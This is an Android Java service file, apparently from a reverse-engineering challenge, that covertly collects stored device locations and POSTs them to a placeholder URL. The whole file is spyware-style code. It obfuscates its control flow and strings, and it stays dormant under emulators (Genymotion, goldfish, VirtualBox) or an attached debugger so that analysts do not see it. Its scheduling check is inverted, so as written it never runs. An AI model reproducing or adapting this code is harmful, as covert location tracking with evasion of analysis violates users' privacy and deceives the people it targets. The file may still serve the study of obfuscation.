package com.woop.tryreverseengineerthis.service;
import android.annotation.TargetApi;
import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Debug;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import com.woop.tryreverseengineerthis.helper.StringHelper;
import com.woop.tryreverseengineerthis.storage.LocationStorage;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.InvalidKeyException;
import java.util.List;
import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;

/**
 * Every x seconds, send all the location collected with a POST call to a URL
 *
 * Created by Jay on 3/29/2016.
 */
public class LocationSniffingService extends Service{

    private final static String TAG = "LocationSniffingService";

    private static Handler mHandler;

    @Override
    public IBinder onBind(Intent intent) {

        if(mHandler != null){
            mHandler = new Handler();
            int delay = 300000;

            //Path Obfuscation
            mHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    if(thisDoesnotDoAnything())
                        return;
                    else
                        thisAlsoDoesnotDoAnything();
                }
            }, delay);
        }
        return null;
    }

    //Starts the handler which will post every delay seconds
    @Override
    public void onCreate(){
    }

    private void thisAlsoDoesnotDoAnything(){

    }

    //Concats all the locations to send
    private boolean sendQuietly() {

        List<Location> locations = LocationStorage.getAllLocation();
        StringBuilder builder = new StringBuilder();
        for(Location loc : locations){
            builder.append(loc.getAltitude());
            builder.append(",");
            builder.append(loc.getLatitude());
            builder.append(",");
            builder.append(loc.getLongitude());
            builder.append(",");
            builder.append(loc.getTime());
            builder.append(",");
            builder.append("||");
        }

        actualSend(builder.toString());

        //Logic Obfuscation
        return builder.length() > 2 ? false : (builder.equals(builder) ? true : false);
    }

    @TargetApi(Build.VERSION_CODES.KITKAT)
    private void actualSend(String s) {
        try {
            URL url = new URL("toBeChanged");
            byte[] postData = s.getBytes(StandardCharsets.UTF_8);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setInstanceFollowRedirects(false);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Content-Length", Integer.toString(postData.length));
            connection.setUseCaches(false);
            try(DataOutputStream wr = new DataOutputStream(connection.getOutputStream())){
                wr.write(postData);
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
            return;
        } catch (IOException e) {
            e.printStackTrace();
            return;
        } catch (Exception e){
            e.printStackTrace();
            return;
        }
        Log.d(TAG, "Sent");
    }

    //Dummy method - b does not mean anything
    private boolean thisDoesnotDoAnything(){

        boolean b = false;

        if (isValid())
            b = sendQuietly();

        return (b^=b) ? (b == b)^(b) : (b^b^b^b);
    }

    //Check if the environment is an emulated environment - just in case it is being analysed
    private boolean isValid(){

        String h1 = "ï<ŠPSÒí¸U1Éà>";
        String k1 = "LetmeTellyoua211";
        String h2 = "ÅhÐ$ h~;ï";
        String k2 = "astoryab0utab0y1";
        String h3 = "›«žòóÎÑãl(!º v";
        String k3 = "n4m3dJackJackJac";
        String h4 = "óê|Ø†5{•§YúÙ7";
        String k4 = "heW4sStudying343";
        String h5 = "j·Òsèfh»oÀ/û¦ˆ“";
        String k5 = "s0ftw4r3Engineer";
        String h6 = "vC&Á.ÌŸ/êäÛØp-";
        String k6 = "j0kessjac21saaaa";
        String h7 = "¶²=¼†),¼ýh9ÕRs¼";
        String k7 = "fr33S0ulllllllll";
        String h8 = "ýxç°|œš14ŽÇ_ü";
        String k8 = "ind33dind33d3333";
        String h9 = "ÿRÐÙŒœKÊ¹Ü!Æ4ã%";
        String k9 = "imtired.........";
        String h10 = "ôô}]¯Ý.l¥h¤¼|‡";
        String k10 = "..a..l0ng..night";
        String h11 = "ˆþŒÀyD!»Vj_$™A";
        String k11 = "...timetosleep..";

        String a1 = "OnceUponATime";
        String a2 = "LivedABunnyCalled";
        String a3 = "Judy.SheWasGoingTo";
        String a4 = "beTheBestCopIn";
        String a5 = "Zo0o0o0o0Topia";
        String a6 = "SheDidNotRealise";
        String a7 = "however,ThatShe";
        String a8 = "wasJustGoingtobe";
        String a9 = "amereparkingWarden";
        String a10 = "sadfacebunny";
        String a11 = "theend";

        String ak1 = "a1a1a1a1a1a1a1a1";
        String ak2 = "b2b2b2b2b2b2b2b2";
        String ak3 = "c3c3c3c3c3c3c3c3";
        String ak4 = "d4d4d4d4d4d4d4d4";
        String ak5 = "55eeeeee55ee55ee";
        String ak6 = "f6f6f6f6f6f6f6f6";
        String ak7 = "g7g7g7g7g7g7g7g7";
        String ak8 = "h8h8h8h8h8h8h8h8";
        String ak9 = "i9i9i9i9i9i9i9i9";
        String ak10 = "00l0al01la0l0100";
        String ak11 = "p11p11p11p11p111";

        String generic = "";
        String unknown = "";
        String googlesdk = "";
        String emulator = "";
        String androidsdk86 = "";
        String genymotion = "";
        String sdk = "";
        String sdk86 = "";
        String vbox = "";
        String goldfish = "";
        String android = "";

        String fingerprint = "";
        String model = "";
        String manufacturer = "";
        String product = "";
        String hardware = "";
        String telephonyservice = "";
        String connectivityservice = "";
        String locationservice = "";
        String gpsprovider = "";
        String networkprovider = "";
        String telephoneoperator = "";

        try{
            generic = StringHelper.getStringStatic(a1, ak1);
            unknown = StringHelper.getStringStatic(a2, ak2);
            googlesdk = StringHelper.getStringStatic(a3, ak3);
            emulator = StringHelper.getStringStatic(a4, ak4);
            androidsdk86 = StringHelper.getStringStatic(a5, ak5);
            genymotion = StringHelper.getStringStatic(a6, ak6);
            sdk = StringHelper.getStringStatic(a7, ak7);
            sdk86 = StringHelper.getStringStatic(a8, ak8);
            vbox = StringHelper.getStringStatic(a9, ak9);
            goldfish = StringHelper.getStringStatic(a10, ak10);
            android = StringHelper.getStringStatic(a11, ak11);

            fingerprint = StringHelper.getStringDynamic(h1, k1);
            model = StringHelper.getStringDynamic(h2, k2);
            manufacturer = StringHelper.getStringDynamic(h3, k3);
            product = StringHelper.getStringDynamic(h4, k4);
            hardware = StringHelper.getStringDynamic(h5, k5);
            telephonyservice = StringHelper.getStringDynamic(h6, k6);
            connectivityservice = StringHelper.getStringDynamic(h7, k7);
            locationservice = StringHelper.getStringDynamic(h8, k8);
            gpsprovider = StringHelper.getStringDynamic(h9, k9);
            networkprovider = StringHelper.getStringDynamic(h10, k10);
            telephoneoperator = StringHelper.getStringDynamic(h11, k11);
        } catch (IllegalBlockSizeException e) {
            e.printStackTrace();
            return false;
        } catch (BadPaddingException e) {
            e.printStackTrace();
            return false;
        } catch (InvalidKeyException e) {
            e.printStackTrace();
            return false;
        }

        //Check build's fingerprint
        Boolean checkFingerprint =  fingerprint.startsWith(generic) ||
                fingerprint.startsWith(unknown);

        //Check build's model
        Boolean checkModel =        model.contains(googlesdk) ||
                model.contains(emulator) ||
                model.contains(androidsdk86);

        //Check Manurfacturer for Genymotion (an emulation software)
        Boolean checkManufacturer = manufacturer.contains(genymotion) ||
                manufacturer.contains(unknown);

        //Check build's product
        Boolean checkProduct = product.contains(sdk) ||
                product.contains(vbox);

        //Check for goldfish hardware
        Boolean checkHardware = hardware.contains(goldfish) ||
                hardware.contains(vbox);

        //Return if any is detected
        if(checkFingerprint || checkModel || checkManufacturer || checkProduct || checkHardware)
            return false;

        //Check for telephone operator
        //Return if it is android
        if(android.equals(telephoneoperator))
            return false;

        //Return if debugger is connected
        if(Debug.isDebuggerConnected())
            return false;

        ConnectivityManager connectivityManager = (ConnectivityManager)
                getSystemService(connectivityservice);

        NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();

        //Return if internet is not connected
        if(networkInfo == null || !(networkInfo.isConnected()))
            return false;


        LocationManager locationManager = (LocationManager)
                getSystemService(locationservice);

        boolean gps_enabled = false;
        boolean network_enabled = false;

        if(locationManager==null)
            locationManager = (LocationManager) this.getSystemService(locationservice);
        try{
            gps_enabled = locationManager.isProviderEnabled(gpsprovider);
        }catch(Exception ex){}
        try{
            network_enabled = locationManager.isProviderEnabled(networkprovider);
        }catch(Exception ex){}

        //If location service is not enabled don't bother
        if(!gps_enabled && !network_enabled)
            return false;

        return true;
    }

}
